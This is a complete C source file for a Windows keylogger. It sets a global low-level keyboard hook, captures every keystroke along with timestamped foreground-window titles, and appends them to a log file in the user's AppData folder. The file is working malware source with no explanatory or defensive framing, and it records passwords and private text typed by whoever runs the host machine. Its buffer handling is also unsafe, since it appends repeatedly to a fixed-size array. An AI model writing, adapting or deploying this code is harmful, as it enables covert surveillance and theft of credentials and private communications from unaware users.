#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <windows.h>

#define FILE "\\log.txt"

KBDLLHOOKSTRUCT kbdStruct;
HHOOK keyboard_hook = NULL;
char current_window[256];
char buffer[256];
int pos=0;
HANDLE hFile;

void writeBuffer(char buffer[], int size){
    DWORD dwBytesWritten;
    char pszValue[256];

    DWORD dwslength = GetEnvironmentVariable("APPDATA", pszValue, sizeof(pszValue));
    if (dwslength == 0) {
        ExitProcess(5);
    }else{
        strcat(pszValue, FILE);
        hFile=CreateFileA(pszValue, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
        SetFilePointer(hFile, 0, 0, FILE_END);
        WriteFile(hFile, buffer, size, &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }
}

short is_Mayus_Enabled(){
    short bloq_mayus=0;
    short shift=0;

    bloq_mayus = GetKeyState(VK_CAPITAL);
    shift = GetKeyState(VK_SHIFT);
    shift = shift<0;

    return bloq_mayus^shift;
}

short is_Alt_Enabled(){

    if (GetKeyState(VK_CONTROL)& 0x8000){
      if(GetKeyState(VK_MENU)& 0x8000){
         return 1;
         }
    }
    return 0;
}

short is_Ctrl_Enabled(){

    if (GetKeyState(VK_CONTROL)& 0x8000){
         return 1;
    }
    return 0;
}

void check_Current_Window(){

    time_t current_time=time(NULL);
    char* c_time=0;
    HWND window =  GetForegroundWindow();
    char title[256];
    char towrite[256];

    GetWindowText(window, title, 256);

    if (strcmp(current_window,title)){
        c_time = ctime(&current_time);
        sprintf (towrite,"\n\n %s Window: %s \n\n", c_time, title);
        writeBuffer(buffer, pos);
        pos=0;
        writeBuffer(towrite, strlen(towrite)-1);
        strncpy(current_window,title, sizeof(current_window));
    }

}

LRESULT CALLBACK keylog (int nCode, WPARAM a, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT keystroke=(PKBDLLHOOKSTRUCT)lParam;
    char key=0;
    short upper_case=0;
    short alt_key=0;
    short ctrl =0;

    char numbershift [] = {'=','!','\"','·','$','%','&','/','(',')'};
    char alt [] ={'|','@','#','~','€','¬'};
    char special [6][15]={"[BACKSPACE]","[TAB]","[RESERVED]","[RESERVED]","[CLEAR]","[ENTER]"};
    char ctrl_tag[]="\[Ctrl + ";
    char ctrl_text[3];
    char *value;


    if ((nCode>=0 && a == WM_KEYDOWN) || a==WM_SYSKEYDOWN){

        check_Current_Window();
        upper_case = is_Mayus_Enabled();
        alt_key = is_Alt_Enabled();
        ctrl = is_Ctrl_Enabled();
        key = MapVirtualKeyA(keystroke->vkCode,2);


        if ((int)keystroke->vkCode>=48 && (int)keystroke->vkCode<=90 && upper_case==1 && ctrl==0){
            if ((int)keystroke->vkCode>=48 && (int)keystroke->vkCode<=57){
                buffer[pos]= (char)numbershift[(int)keystroke->vkCode-48];
                pos++;
                if (pos >= 200) {
                   writeBuffer(buffer, pos);
                   pos=0;
                }
            }else{
                buffer[pos]=(char)key;
                pos++;
                if (pos >= 200) {
                   writeBuffer(buffer, pos);
                   pos=0;
                }
            }
        }else if ((int)keystroke->vkCode>=49 && (int)keystroke->vkCode<=54 && alt_key==1){
            buffer[pos]=(char)alt[(int)keystroke->vkCode-49];
            pos++;
            if (pos >= 200) {
                writeBuffer(buffer, pos);
                pos=0;
            }
        }else if ((int)keystroke->vkCode>=30 && (int)keystroke->vkCode<=190 && upper_case==0 && ctrl==0){
            buffer[pos]=tolower((char)key);
            pos++;
            if (pos >= 200) {
                writeBuffer(buffer, pos);
                pos=0;
            }
        }else if ((int)keystroke->vkCode>=8 &&(int)keystroke->vkCode<=13){
            value = special[keystroke->vkCode-8];
            strncpy(&buffer[pos],value, sizeof(buffer)-pos);
            pos = pos+strlen(value);
            if (pos >= 200) {
                writeBuffer(buffer, pos);
                pos=0;
            }
        }else if ((int)keystroke->vkCode>=65 && (int)keystroke->vkCode<=90 && ctrl==1){
            ctrl_text[1]= ']';
            ctrl_text[2]= '\0';
            ctrl_text[0]= (char)key;
            strcat (ctrl_tag,ctrl_text);
            printf ("%s", ctrl_tag);
            strncpy(&buffer[pos],ctrl_tag, strlen(ctrl_tag));
            pos=pos+strlen(ctrl_tag);
            if (pos >= 200) {
                writeBuffer(buffer, pos);
                pos=0;
            }
        }
    }

    return CallNextHookEx(keyboard_hook, nCode, a, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,PSTR lpCmdLine, int nCmdShow){
    MSG msg;

    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keylog, NULL,0);

    if(!keyboard_hook)
        printf ("HOOK FAILED\n");

    while(!GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboard_hook);
    return 0;
}
